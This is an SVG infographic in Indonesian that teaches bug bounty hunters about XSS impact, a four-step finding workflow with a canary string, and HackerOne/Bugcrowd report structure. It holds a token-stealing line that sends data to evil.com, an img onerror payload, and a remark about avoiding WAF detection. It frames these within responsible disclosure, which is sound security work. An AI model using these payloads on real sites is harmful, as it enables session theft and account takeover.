<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad4" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Backgrounds -->
    <linearGradient id="cardGrad4" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <!-- Shadow -->
    <filter id="cardShadow4" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Glows -->
    <filter id="glowRose4" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowCyan4" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowGreen4" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>

    <!-- Arrow Markers -->
    <marker id="arrowCyan4" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
    </marker>
    <marker id="arrowGreen4" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#10B981"/>
    </marker>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11.5px; fill: #CBD5E1; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10.5px; font-weight: 700; }
  </style>

  <!-- Base Background -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad4)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Grid Pattern -->
  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
    <line x1="0" y1="80" x2="1080" y2="80"/>
    <line x1="0" y1="160" x2="1080" y2="160"/>
    <line x1="0" y1="240" x2="1080" y2="240"/>
    <line x1="0" y1="320" x2="1080" y2="320"/>
    <line x1="0" y1="400" x2="1080" y2="400"/>
    <line x1="0" y1="480" x2="1080" y2="480"/>
    <line x1="180" y1="0" x2="180" y2="560"/>
    <line x1="360" y1="0" x2="360" y2="560"/>
    <line x1="540" y1="0" x2="540" y2="560"/>
    <line x1="720" y1="0" x2="720" y2="560"/>
    <line x1="900" y1="0" x2="900" y2="560"/>
  </g>

  <!-- Header -->
  <g transform="translate(48, 40)">
    <rect x="0" y="0" width="165" height="24" rx="12" fill="#E11D48" fill-opacity="0.15" stroke="#E11D48" stroke-width="1"/>
    <text x="82" y="16" text-anchor="middle" class="badge" fill="#FB7185">BUG BOUNTY GUIDE</text>
    <text x="180" y="18" class="title" font-size="20">XSS: Dampak Serangan Nyata &amp; Metodologi Bug Hunter</text>
    <text x="0" y="42" class="subtitle" font-size="13">Dari sekadar alert(1) menuju pemahaman dampak eksploitasi nyata, canary tracing, dan format laporan triage resmi</text>
  </g>

  <!-- ==================== COLUMN 1: REAL-WORLD IMPACT ==================== -->
  <g transform="translate(48, 115)" filter="url(#cardShadow4)">
    <rect width="310" height="405" rx="14" fill="url(#cardGrad4)" stroke="#F43F5E" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#881337" stroke="#F43F5E" stroke-width="1.5"/>
    <path d="M28 38 L48 38 M38 28 L48 38 L38 48" stroke="#FECDD3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#FDA4AF">1. Dampak Serangan Nyata</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Di Luar Pop-up alert(1)</text>

    <line x1="18" y1="68" x2="292" y2="68" stroke="#881337" stroke-width="1"/>

    <!-- Attack Arsenal List -->
    <g transform="translate(16, 78)">
      <!-- Item 1 -->
      <rect width="278" height="52" rx="6" fill="#090D16" stroke="#4C0519" stroke-width="1"/>
      <text x="12" y="18" class="badge" fill="#FDA4AF">A. PENCURIAN TOKEN &amp; COOKIE</text>
      <text x="12" y="38" class="code-text" font-size="9.5" fill="#CBD5E1">fetch('https://evil.com/loot?t='+token)</text>

      <!-- Item 2 -->
      <rect y="60" width="278" height="52" rx="6" fill="#090D16" stroke="#4C0519" stroke-width="1"/>
      <text x="12" y="78" class="badge" fill="#FDA4AF">B. AKSI DIAM-DIAM DI BACKGROUND</text>
      <text x="12" y="98" class="desc-text" font-size="10.5">Ubah email/password via fetch() korban</text>

      <!-- Item 3 -->
      <rect y="120" width="278" height="52" rx="6" fill="#090D16" stroke="#4C0519" stroke-width="1"/>
      <text x="12" y="138" class="badge" fill="#FDA4AF">C. IN-SESSION PHISHING (DOM)</text>
      <text x="12" y="158" class="desc-text" font-size="10.5">Modal login palsu di domain asli (HTTPS)</text>

      <!-- Item 4 -->
      <rect y="180" width="278" height="52" rx="6" fill="#090D16" stroke="#4C0519" stroke-width="1"/>
      <text x="12" y="198" class="badge" fill="#FDA4AF">D. KEYLOGGER &amp; XSS WORM</text>
      <text x="12" y="218" class="desc-text" font-size="10.5">Merekam ketikan &amp; menyebar otomatis</text>

      <!-- Summary -->
      <rect y="240" width="278" height="66" rx="6" fill="#4C0519" fill-opacity="0.4" stroke="#F43F5E" stroke-width="1"/>
      <text x="12" y="260" class="badge" fill="#FFF1F2">HASIL: FULL ORIGIN TAKEOVER</text>
      <text x="12" y="278" class="desc-text" font-size="10.5">Akses penuh atas sesi akun pengguna!</text>
    </g>
  </g>

  <!-- ==================== COLUMN 2: BUG HUNTER 4-STEP WORKFLOW ==================== -->
  <g transform="translate(385, 115)" filter="url(#cardShadow4)">
    <rect width="320" height="405" rx="14" fill="url(#cardGrad4)" stroke="#38BDF8" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#0369A1" stroke="#38BDF8" stroke-width="1.5"/>
    <circle cx="38" cy="38" r="8" fill="none" stroke="#E0F2FE" stroke-width="2"/>
    <circle cx="38" cy="38" r="3" fill="#E0F2FE"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#E0F2FE">2. Bug Hunter Workflow</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#38BDF8">4 Langkah Penemuan Celah</text>

    <line x1="18" y1="68" x2="302" y2="68" stroke="#0284C7" stroke-width="1"/>

    <!-- Workflow Steps -->
    <g transform="translate(16, 78)">
      <!-- Step 1 -->
      <rect width="288" height="52" rx="6" fill="#090D16" stroke="#0284C7" stroke-width="1"/>
      <text x="12" y="18" class="badge" fill="#38BDF8">LANGKAH 1: CANARY INJECTION</text>
      <text x="12" y="38" class="code-text" font-size="10" fill="#CBD5E1">testxss123'"&lt;&gt;/</text>

      <!-- Step 2 -->
      <rect y="60" width="288" height="52" rx="6" fill="#090D16" stroke="#0284C7" stroke-width="1"/>
      <text x="12" y="78" class="badge" fill="#38BDF8">LANGKAH 2: SINK IDENTIFICATION</text>
      <text x="12" y="98" class="desc-text" font-size="10.5">Cek lokasi di HTML, Atribut, Script, dsb.</text>

      <!-- Step 3 -->
      <rect y="120" width="288" height="52" rx="6" fill="#090D16" stroke="#0284C7" stroke-width="1"/>
      <text x="12" y="138" class="badge" fill="#38BDF8">LANGKAH 3: UNESCAPED CHARS CHECK</text>
      <text x="12" y="158" class="desc-text" font-size="10.5">Cek apakah tanda ', ", atau &lt; tidak di-encode</text>

      <!-- Step 4 -->
      <rect y="180" width="288" height="52" rx="6" fill="#090D16" stroke="#0284C7" stroke-width="1"/>
      <text x="12" y="198" class="badge" fill="#38BDF8">LANGKAH 4: CONTEXT PAYLOAD</text>
      <text x="12" y="218" class="code-text" font-size="10" fill="#34D399">&lt;img src=x onerror=alert(doc.domain)&gt;</text>

      <!-- Step Status -->
      <rect y="240" width="288" height="66" rx="6" fill="#0C4A6E" fill-opacity="0.4" stroke="#38BDF8" stroke-width="1"/>
      <text x="12" y="260" class="badge" fill="#E0F2FE">METODOLOGI SISTEMATIS</text>
      <text x="12" y="278" class="desc-text" font-size="10.5">Mencegah deteksi dini oleh WAF!</text>
    </g>
  </g>

  <!-- ==================== COLUMN 3: REPORTING & TRIAGE ==================== -->
  <g transform="translate(730, 115)" filter="url(#cardShadow4)">
    <rect width="302" height="405" rx="14" fill="url(#cardGrad4)" stroke="#10B981" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#064E3B" stroke="#34D399" stroke-width="1.5"/>
    <path d="M28 38 L36 44 L48 30" stroke="#34D399" stroke-width="2" fill="none" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#A7F3D0">3. Standar PoC &amp; Report</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#6EE7B7">HackerOne / Bugcrowd Triage</text>

    <line x1="18" y1="68" x2="284" y2="68" stroke="#047857" stroke-width="1"/>

    <!-- Report Checklist -->
    <g transform="translate(14, 78)">
      <!-- Box 1 -->
      <rect width="274" height="65" rx="6" fill="#090D16" stroke="#047857" stroke-width="1"/>
      <text x="12" y="18" class="badge" fill="#34D399">STANDAR POC RESMI:</text>
      <text x="12" y="36" class="code-text" font-size="10" fill="#FDE047">alert(document.domain)</text>
      <text x="12" y="52" class="desc-text" font-size="10">Membuktikan eksekusi di origin resmi ✓</text>

      <!-- Box 2 -->
      <rect y="74" width="274" height="110" rx="6" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
      <text x="12" y="20" class="badge" fill="#CBD5E1">STRUKTUR LAPORAN TRIAGE:</text>
      <text x="12" y="40" class="desc-text" font-size="10.5">1. <tspan font-weight="700" fill="#F8FAFC">Summary &amp; Severity</tspan> (Reflected/Stored)</text>
      <text x="12" y="58" class="desc-text" font-size="10.5">2. <tspan font-weight="700" fill="#F8FAFC">Endpoint &amp; Parameter</tspan> Rentan</text>
      <text x="12" y="76" class="desc-text" font-size="10.5">3. <tspan font-weight="700" fill="#F8FAFC">Steps to Reproduce</tspan> (Langkah jelas)</text>
      <text x="12" y="94" class="desc-text" font-size="10.5">4. <tspan font-weight="700" fill="#F8FAFC">Screenshot PoC</tspan> &amp; Remediasi</text>

      <!-- Box 3 -->
      <rect y="192" width="274" height="114" rx="6" fill="#064E3B" fill-opacity="0.3" stroke="#10B981" stroke-width="1"/>
      <text x="12" y="20" class="badge" fill="#34D399">ATURAN EMAS BUG HUNTER:</text>
      <text x="12" y="40" class="desc-text" font-size="10.5">• Gunakan 2 akun sendiri (No live victims)</text>
      <text x="12" y="60" class="desc-text" font-size="10.5">• Bersihkan payload Stored XSS</text>
      <text x="12" y="80" class="desc-text" font-size="10.5">• Jangan curi data riil pengguna</text>
      <text x="12" y="100" class="badge" fill="#ECFDF5">✓ VALID &amp; BOUNTY REWARDED</text>
    </g>
  </g>

  <!-- Connectors -->
  <path d="M 358 250 L 385 250" fill="none" stroke="#38BDF8" stroke-width="2.5" stroke-dasharray="4,4" marker-end="url(#arrowCyan4)"/>
  <path d="M 705 250 L 730 250" fill="none" stroke="#10B981" stroke-width="2.5" stroke-dasharray="4,4" marker-end="url(#arrowGreen4)"/>

</svg>
